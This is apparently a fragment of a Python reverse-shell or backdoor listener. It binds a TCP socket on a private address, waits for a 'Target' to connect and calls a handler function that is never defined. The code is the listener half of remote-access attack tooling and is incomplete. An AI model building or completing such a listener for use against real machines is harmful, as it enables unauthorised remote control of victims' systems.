import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('10.30.90.14', 5555))
print("[+] Listening For The Incoming Connections")
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication()